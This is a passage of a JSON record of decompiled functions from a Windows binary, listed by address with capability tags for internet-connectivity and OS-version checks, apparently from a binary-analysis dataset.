        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.000286a0(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, uint *arg_18h, uint *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *var_a0h;\n    uint *var_9ch;\n    uint *var_98h;\n    uint *var_94h;\n    uint var_90h;\n    uint var_8ch;\n    int32_t var_64h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_37h;\n    int32_t var_2bh;\n    uint var_27h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4ch = 0;\n    if (arg_14h < 0x3d) {\n        var_94h = 0x21590064;\n    }\n    else {\n        var_98h = fcn.000298c0(400, 20000);\n        puVar2 = arg_10h;\n        puVar3 = &var_48h;\n        for (iVar1 = 0xf; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = *puVar2;\n        fcn.000255d0(&var_48h);\n        if (arg_20h == 0) {\n            if (var_37h == -1) {\n                var_37h = arg_14h - 0x3d;\n            }\n            if (var_2bh == -1) {\n                var_2bh = var_37h;\n            }\n        }\n        if ((var_3ch & 1) == 0) {\n            var_4h = fcn.00023930(var_48h, var_44h, &var_40h, &var_90h);\n            if (var_4h == 0) {\n                if (var_64h == var_2bh) {\ncode_r0x0002880b:\n                    if (arg_20h == 0) {\n                        if (var_37h + 0x3dU == arg_14h) {\n                            var_4h = fcn.000239f0(var_48h, var_44h, var_8ch, stack0xffffffc1, arg_10h + 0x3d, var_37h);\n                            if (var_4h == 0) {\ncode_r0x00028924:\n                                var_94h = NULL;\n                                if (((var_44h == 0) && (iVar1 = fcn.000298c0(1, 0),  var_48h == iVar1)) &&\n                                   (iVar1 = fcn.00037730(0x800db8b8),  iVar1 != 0)) {\n                                    fcn.00034570(0x800db8b8);\n                                }\n                            }\n                            else {\n                                var_94h = var_4h + 0x191U | 0x21590000;\n                            }\n                        }\n                        else {\n                            var_94h = 0x21590064;\n                        }\n                    }\n                    else {\n                        var_8h = stack0xffffffc1;\n                        while( true ) {\n                            puVar2 = var_98h;\n                            var_90h = 0;\n                            var_94h = var_98h;\n                            var_98h = &var_9ch;\n                            var_9ch = &var_a0h;\n                            var_94h = fcn.00077fd0(arg_8h, var_9ch, var_98h, puVar2, 0);\n                            if (var_94h != NULL) break;\n                            if (var_9ch == NULL) goto code_r0x00028924;\n                            var_4h = fcn.000239f0(var_48h, var_44h, var_8ch, var_8h, var_a0h, var_9ch);\n                            fcn.00077fa0(arg_8h, var_a0h, 0);\n                            if (var_4h != 0) {\n                                var_94h = var_4h + 0x191U | 0x21590000;\n                                break;\n                            }\n                            var_8h = var_8h + var_9ch;\n                        }\n                    }\n                }\n                else {\n                    var_94h = 0x215901f6;\n                }\n            }\n            else {\n                var_94h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            do {\n                var_a0h = &var_90h;\n                iVar1 = fcn.00023930(var_48h, var_44h, &var_40h, var_a0h);\n                if (iVar1 != 0) {\n                    var_4h = fcn.000239b0(var_48h, var_44h, var_40h, var_2bh, &var_27h, &var_8ch);\n                    if (var_4h == 0) goto code_r0x0002880b;\n                    var_94h = var_4h + 0x191U | 0x21590000;\n                    goto code_r0x0002895a;\n                }\n                var_4h = fcn.00023a80(var_48h, var_44h, var_8ch);\n            } while (var_4h == 0);\n            var_94h = var_4h + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x0002895a:\n    fcn.000357f0(var_4ch);\n    *arg_18h = 0;\n    *arg_1ch = 0;\n    return var_94h;\n}\n",
        "token_count": 1425
    },
    "00028990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00028990(uint noname_0, uint noname_1, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_14h < 0x3d) {\n        var_54h = 0x21590064;\n    }\n    else {\n        var_8h = arg_10h;\n        fcn.000255d0(arg_10h);\n        if ((*(var_8h + 3) & 1) == 0) {\n            var_4h = fcn.00023930(*var_8h, var_8h[1], var_8h + 2, &var_50h);\n            if (var_4h == 0) {\n                var_4h = fcn.00023a80(*var_8h, var_8h[1], var_4ch);\n            }\n        }\n        else {\n            var_4h = fcn.00028a60(*var_8h, var_8h[1], var_8h[2] + 1);\n        }\n        if (var_4h == 0) {\n            var_54h = 0;\n        }\n        else {\n            var_54h = var_4h + 0x191U | 0x21590000;\n        }\n    }\n    fcn.000357f0(var_ch);\n    return var_54h;\n}\n",
        "token_count": 372
    },
    "00028a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00028a60(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = 0;\n    var_8h = fcn.000238f0(arg_8h, arg_ch, &var_4h, &var_14h);\n    if (var_8h == 0) {\n        var_10h = 0;\n        for (var_ch = 0; var_ch < var_4h; var_ch = var_ch + 1) {\n            if ((arg_10h <= *(var_14h + 0xc + var_ch * 0x40)) && ((*(var_14h + 0xc + var_ch * 0x40) & 0x80000000) == 0))\n            {\n                *(var_14h + 4 + var_ch * 0x40) = 0xffffffff;\n            }\n        }\n        fcn.00023ab0(var_14h, var_4h);\n        fcn.00023b90(var_14h);\n    }\n    else {\n        var_10h = var_8h + 0x191U | 0x21590000;\n    }\n    return var_10h;\n}\n",
        "token_count": 323
    },
    "00028b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00028b20(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    *arg_10h = 0;\n    iVar1 = fcn.00029960(&var_10h, 0x10, 0x228);\n    if (iVar1 == 0) {\n        iVar1 = fcn.000207f0(&var_10h, 0x10, *arg_8h, *arg_ch);\n        if (iVar1 == -1) {\n            uVar2 = 0x215901fa;\n        }\n        else {\n            arg_10h_00 = fcn.000356c0(iVar1);\n            if (arg_10h_00 == 0) {\n                uVar2 = 0x21590004;\n            }\n            else {\n                fcn.00020840(&var_10h, 0x10, arg_10h_00, *arg_8h, *arg_ch);\n                *arg_8h = arg_10h_00;\n                *arg_ch = iVar1;\n                *arg_10h = arg_10h_00;\n                uVar2 = 0;\n            }\n        }\n    }\n    else {\n        uVar2 = 0x215901f9;\n    }\n    return uVar2;\n}\n",
        "token_count": 348
    },
    "00028c30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00028c30(int32_t arg_8h)\n\n{\n    fcn.00024750();\n    if (arg_8h != 0) {\n        fcn.00043cb0(5000);\n        fcn.00024160(0x800db8c0, *0x800db8b4);\n    }\n    return 0;\n}\n",
        "token_count": 85
    },
    "00028cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00028cd0(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint var_30h;\n    int32_t var_2ch;\n    uint8_t *var_24h;\n    uint8_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    if (*0x800cd104 == 0) {\n        var_8h = 0;\n    }\n    else {\n        fcn.00034a10(0x800ccfc4);\n        for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n            if (*(*0x800cd104 + var_4h * 0x1a0) != 0) {\n                var_ch = arg_8h;\n                var_10h = *0x800cd104 + 4 + var_4h * 0x1a0;\n                do {\n                    uVar1 = *var_10h;\n                    bVar2 = uVar1 < *var_ch;\n                    if (uVar1 != *var_ch) {\ncode_r0x00028d85:\n                        var_18h = (1 - bVar2) - (bVar2 != 0);\n                        goto code_r0x00028d8d;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = var_10h[1];\n                    bVar2 = uVar1 < var_ch[1];\n                    if (uVar1 != var_ch[1]) goto code_r0x00028d85;\n                    var_10h = var_10h + 2;\n                    var_ch = var_ch + 2;\n                } while (uVar1 != 0);\n                var_18h = 0;\ncode_r0x00028d8d:\n                if (var_18h == 0) {\n                    var_20h = arg_8h + 0x80;\n                    var_24h = *0x800cd104 + 0x84 + var_4h * 0x1a0;\n                    do {\n                        uVar1 = *var_24h;\n                        bVar2 = uVar1 < *var_20h;\n                        if (uVar1 != *var_20h) {\ncode_r0x00028dfe:\n                            var_2ch = (1 - bVar2) - (bVar2 != 0);\n                            goto code_r0x00028e06;\n                        }\n                        if (uVar1 == 0) break;\n                        uVar1 = var_24h[1];\n                        bVar2 = uVar1 < var_20h[1];\n                        if (uVar1 != var_20h[1]) goto code_r0x00028dfe;\n                        var_24h = var_24h + 2;\n                        var_20h = var_20h + 2;\n                    } while (uVar1 != 0);\n                    var_2ch = 0;\ncode_r0x00028e06:\n                    if (var_2ch == 0) {\n                        var_8h = *(*0x800cd104 + var_4h * 0x1a0);\n                        *(*0x800cd104 + var_4h * 0x1a0) = 0;\n                        break;\n                    }\n                }\n            }\n        }\n        fcn.00034a80(0x800ccfc4);\n    }\n    return var_8h;\n}\n",
        "token_count": 835
    },
    "00028e60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00028e60(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t var_4h;\n    \n    if ((arg_8h == 0) || (*0x800cd104 == 0)) {\n        return;\n    }\n    fcn.00034a10(0x800ccfc4);\n    var_4h = 0;\n    while( true ) {\n        if (0x13 < var_4h) goto code_r0x00028f0a;\n        if (*(*0x800cd104 + var_4h * 0x1a0) == 0) break;\n        var_4h = var_4h + 1;\n    }\n    *(*0x800cd104 + var_4h * 0x1a0) = arg_8h;\n    puVar3 = arg_ch;\n    puVar4 = *0x800cd104 + 4 + var_4h * 0x1a0;\n    for (iVar2 = 0x65; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    uVar1 = fcn.00026ff0();\n    *(*0x800cd104 + 0x19c + var_4h * 0x1a0) = uVar1;\n    arg_8h = 0;\ncode_r0x00028f0a:\n    fcn.00034a80(0x800ccfc4);\n    if (arg_8h == 0) {\n        return;\n    }\n    fcn.000775b0(&arg_8h, 0);\n    return;\n}\n",
        "token_count": 441
    },
    "00028f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.00028f30(void)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    do {\n        iVar1 = fcn.000345a0(0x800ccf1c, 30000);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00034a10(0x800ccfc4);\n        for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n            if (*(*0x800cd104 + var_4h * 0x1a0) != 0) {\n                iVar1 = fcn.00026ff0();\n                if (300000 < iVar1 - *(*0x800cd104 + 0x19c + var_4h * 0x1a0)) {\n                    fcn.000775b0(var_4h * 0x1a0 + *0x800cd104, 0);\n                    *(*0x800cd104 + var_4h * 0x1a0) = 0;\n                    break;\n                }\n            }\n        }\n        fcn.00034a80(0x800ccfc4);\n    } while( true );\n}\n",
        "token_count": 300
    },
    "00028ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.00028ff0(uint arg_8h, uint noname_1, int32_t arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            int32_t arg_20h)\n\n{\n    uint *puVar1;\n    uint arg_14h_00;\n    int32_t iVar2;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint32_t var_270h;\n    uint *var_26ch;\n    uint var_268h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_5ch = 0;\n    var_270h = 0;\n    var_4h = 0;\n    var_18h = fcn.000298c0(1, 0);\n    if (arg_20h == 0) {\n        var_64h = arg_10h;\n        var_60h = 0;\n        var_14h = 0;\n        while( true ) {\n            if ((arg_14h <= var_60h) || (0x7f < var_14h)) goto code_r0x0002932c;\n            if (arg_14h < var_60h + 0x19U) break;\n            var_5ch = fcn.00035950(*(var_64h + var_60h));\n            if (arg_14h - var_60h < var_5ch) {\n                var_270h = 0x21590201;\n                goto code_r0x0002932c;\n            }\n            var_60h = var_60h + 4;\n            puVar1 = var_64h + var_60h;\n            var_288h = *puVar1;\n            var_284h = puVar1[1];\n            var_280h = puVar1[2];\n            var_27ch = puVar1[3];\n            var_278h = puVar1[4];\n            var_274h._0_1_ = *(puVar1 + 5);\n            fcn.00024120(&var_288h);\n            if (var_4h == 0) {\n                var_ch = fcn.000238b0(var_18h, 9, var_284h, var_64h + var_60h, var_5ch, 0);\n                if (var_ch == 0) {\n                    (&var_268h)[var_14h] = var_284h;\n                }\n                else {\n                    var_270h = var_ch + 0x191U | 0x21590000;\n                    fcn.00027930(var_284h, var_270h, 0, 0);\n                    var_4h = 1;\n                }\n            }\n            else {\n                fcn.00027930(var_284h, 0x21590006, 0, 0);\n            }\n            var_60h = var_60h + var_5ch;\n            var_14h = var_14h + 1;\n        }\n        var_270h = 0x21590201;\n    }\n    else {\n        arg_14h_00 = fcn.000298c0(400, 20000);\n        for (var_14h = 0; var_26ch = NULL,  var_14h < 0x80; var_14h = var_14h + 1) {\n            var_270h = fcn.00077fd0(arg_8h, &var_26ch, &var_5ch, arg_14h_00, 0);\n            if (var_270h != 0) {\n                var_270h = 0x21590201;\n                break;\n            }\n            if (var_5ch == 0) break;\n            if (var_5ch < 0x15) {\n                var_270h = 0x21590201;\n                break;\n            }\n            var_288h = *var_26ch;\n            var_284h = var_26ch[1];\n            var_280h = var_26ch[2];\n            var_27ch = var_26ch[3];\n            var_278h = var_26ch[4];\n            var_274h._0_1_ = *(var_26ch + 5);\n            fcn.00024120(&var_288h);\n            if (var_4h == 0) {\n                var_ch = fcn.000238b0(var_18h, 9, var_284h, var_26ch, var_5ch, 0);\n                if (var_ch == 0) {\n                    (&var_268h)[var_14h] = var_284h;\n                }\n                else {\n                    var_270h = var_ch + 0x191U | 0x21590000;\n                    fcn.00027930(var_284h, var_270h, 0, 0);\n                    var_4h = 1;\n                }\n            }\n            else {\n                fcn.00027930(var_284h, 0x21590006, 0, 0);\n            }\n            fcn.00077fa0(arg_8h, var_26ch, 0);\n        }\n        fcn.00077fa0(arg_8h, var_26ch, 0);\n    }\ncode_r0x0002932c:\n    if (var_270h == 0) {\n        for (var_10h = 0; var_10h < var_14h; var_10h = var_10h + 1) {\n            iVar2 = fcn.00023930(var_18h, 9, &var_268h + var_10h, &var_58h);\n            if ((iVar2 == 0) && (iVar2 = fcn.00023ae0(var_58h, var_50h, var_54h, 0, &var_8h),  iVar2 != 0)) {\n                fcn.00023a80(var_58h, var_50h, var_54h);\n            }\n        }\n        fcn.000262f0();\n    }\n    else {\n        for (var_10h = 0; var_10h < var_14h; var_10h = var_10h + 1) {\n            iVar2 = fcn.00023930(var_18h, 9, &var_268h + var_10h, &var_58h);\n            if (iVar2 == 0) {\n                fcn.00023a80(var_58h, var_50h, var_54h);\n            }\n        }\n    }\n    return var_270h;\n}\n",
        "token_count": 1624
    },
    "00029490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00029490(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.000299c0(&var_14h, 0x10);\n    if (iVar1 == 0) {\n        *arg_8h = 0xfffffffd;\n    }\n    else {\n        if (iVar1 != 5) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n        *arg_8h = 0xfffffffe;\n    }\n    return 0;\n}\n",
        "token_count": 141
    },
    "00029500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00029500(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint32_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint32_t arg_8h_00;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_38h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_4h = 0;\n    var_8h = -2;\n    if (arg_8h == 3) {\n        var_ch = fcn.000299c0(&var_20h, 0x10);\n        if (var_ch == 0) {\n            var_8h = -3;\n        }\n        else if (var_ch != 5) {\n            return var_ch;\n        }\n    }\n    if ((var_8h == -2) && (var_ch = fcn.00029960(&var_20h, 0x10, 0x229),  var_ch != 0)) {\n        return var_ch;\n    }\n    if (arg_1ch == 0) {\n        var_ch = fcn.00023930(var_8h, arg_8h, &arg_ch, &var_68h);\n    }\n    else {\n        var_ch = fcn.00023970(var_8h, arg_8h, arg_ch, &var_68h);\n    }\n    if (var_ch != 0) {\n        return var_ch;\n    }\n    var_10h = fcn.000356c0(var_38h);\n    if (var_10h == 0) {\n        return -1;\n    }\n    var_ch = fcn.00023a30(var_8h, arg_8h, var_64h, 0, var_10h, var_38h, &var_24h);\n    if (var_ch == 0) {\n        arg_8h_00 = fcn.000207f0(&var_20h, 0x10, var_10h, var_24h);\n        if (arg_8h_00 == 0xffffffff) {\n            var_ch = -1;\n        }\n        else {\n            if (arg_14h < arg_8h_00) {\n                if (arg_14h == 0) {\n                    *arg_18h = arg_8h_00;\n                }\n                else {\n                    var_4h = fcn.000356c0(arg_8h_00);\n                    if (var_4h == 0) {\n                        var_ch = -1;\n                        goto code_r0x000296c8;\n                    }\n                    fcn.00020840(&var_20h, 0x10, var_4h, var_10h, var_24h);\n                    fcn.00078be8(arg_10h, var_4h, arg_14h);\n                    *arg_18h = arg_14h;\n                    fcn.000357f0(var_4h);\n                }\n            }\n            else {\n                fcn.00020840(&var_20h, 0x10, arg_10h, var_10h, var_24h);\n                *arg_18h = arg_8h_00;\n            }\n            var_ch = 0;\n        }\n    }\ncode_r0x000296c8:\n    fcn.000357f0(var_10h);\n    fcn.000357f0(var_4h);\n    return var_ch;\n}\n",
        "token_count": 837
    },
    "00029710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00029710(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_24h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = -2;\n    if (arg_8h == 3) {\n        var_8h = fcn.000299c0(&var_60h, 0x10);\n        if (var_8h == 0) {\n            var_4h = -3;\n        }\n        else if (var_8h != 5) {\n            return var_8h;\n        }\n    }\n    if ((var_4h != -2) || (var_8h = fcn.00029960(&var_60h, 0x10, 0x229),  var_8h == 0)) {\n        var_10h = fcn.00020700(&var_60h, 0x10, arg_14h);\n        var_ch = fcn.000356c0(var_10h);\n        if (var_ch == 0) {\n            var_8h = -1;\n        }\n        else {\n            var_10h = fcn.00020720(&var_60h, 0x10, var_ch, arg_10h, arg_14h);\n            if (arg_1ch == 0) {\n                var_8h = fcn.000238b0(var_4h, arg_8h, arg_ch, var_ch, var_10h, arg_18h);\n            }\n            else {\n                var_8h = fcn.00023930(var_4h, arg_8h, &arg_ch, &var_50h);\n                if (var_8h == 0) {\n                    if (var_24h < var_10h) {\n                        fcn.00023a80(var_4h, arg_8h, var_4ch);\n                        var_8h = fcn.000238b0(var_4h, arg_8h, arg_ch, var_ch, var_10h, arg_18h);\n                    }\n                    else {\n                        var_8h = fcn.00023b20(var_4h, arg_8h, var_4ch);\n                        if (var_8h == 0) {\n                            var_8h = fcn.000239f0(var_4h, arg_8h, var_4ch, 0, var_ch, var_10h);\n                        }\n                    }\n                }\n                else {\n                    var_8h = fcn.000238b0(var_4h, arg_8h, arg_ch, var_ch, var_10h, arg_18h);\n                }\n            }\n            fcn.000357f0(var_ch);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 697
    },
    "00029900": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00029900(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_78h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    \n    fcn.00078ad4(&var_68h, 0x800545f0, arg_ch);\n    var_6ch = &var_68h;\n    do {\n        cVar1 = *var_6ch;\n        var_6ch = var_6ch + 1;\n    } while (cVar1 != '\\0');\n    fcn.000296f0(arg_8h, &var_68h, var_6ch + (1 - (&var_68h + 1)));\n    return;\n}\n",
        "token_count": 173
    },
    "00029960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00029960(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_48h;\n    uint var_44h;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023930(0xfffffffe, 2, &arg_10h, &var_48h);\n    if (var_4h == 0) {\n        if (var_18h == arg_ch) {\n            var_4h = fcn.00023a30(0xfffffffe, 2, var_44h, 0, arg_8h, arg_ch, &arg_ch);\n        }\n        else {\n            var_4h = -1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 187
    },
    "000299c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000299c0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    var_4ch = 0x229;\n    var_4h = fcn.00023930(0xfffffffd, 2, &var_4ch, &var_48h);\n    if (var_4h == 0) {\n        if (var_18h == arg_ch) {\n            var_4h = fcn.00023a30(0xfffffffd, 2, var_44h, 0, arg_8h, arg_ch, &arg_ch);\n        }\n        else {\n            var_4h = -1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 200
    },
    "00029a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00029a20(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_440h;\n    int32_t var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint *var_428h;\n    int32_t var_424h;\n    uint var_420h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_14h = fcn.000238f0(0xfffffffe, 2, &var_18h, &var_424h);\n    if (var_14h == 0) {\n        var_438h = 0x15;\n        var_434h = 3;\n        var_430h = 0x16;\n        var_42ch = 200;\n        var_8h = 0;\n        var_4h = 0;\n        var_10h = 2;\n        var_ch = &var_438h;\n        var_4h = fcn.000357b0(0x10, var_18h);\n        if (var_4h == 0) {\n            fcn.00023b90(var_424h);\n            uVar1 = 0x21590004;\n        }\n        else {\n            for (var_1ch = 0; var_1ch < var_18h; var_1ch = var_1ch + 1) {\n                if ((((*(var_424h + 0xc + var_1ch * 0x40) != 0x227) && (*(var_424h + 0xc + var_1ch * 0x40) != 0x228)) &&\n                    (*(var_424h + 0xc + var_1ch * 0x40) != 0x229)) &&\n                   ((iVar2 = fcn.000294e0(*(var_424h + 0xc + var_1ch * 0x40), &var_420h, 0x400, &var_43ch),  iVar2 == 0\n                    && (var_428h = fcn.000356c0(var_10h * 0x10 + var_43ch),  var_428h != NULL)))) {\n                    fcn.00078bfa(var_428h, 0, var_10h << 4);\n                    var_428h[1] = var_428h + 2;\n                    *var_428h = 4;\n                    *var_428h[1] = *(var_424h + 0xc + var_1ch * 0x40);\n                    var_428h[4] = var_43ch;\n                    var_428h[5] = var_428h + var_10h * 4;\n                    fcn.00078be8(var_428h + var_10h * 4, &var_420h, var_43ch);\n                    *(var_4h + var_8h * 4) = var_428h;\n                    var_8h = var_8h + 1;\n                }\n            }\n            uVar1 = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n            for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n                fcn.000357f0(*(var_4h + var_1ch * 4));\n            }\n            fcn.000357f0(var_4h);\n            fcn.00023b90(var_424h);\n        }\n    }\n    else {\n        uVar1 = var_14h + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 949
    },
    "00029cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
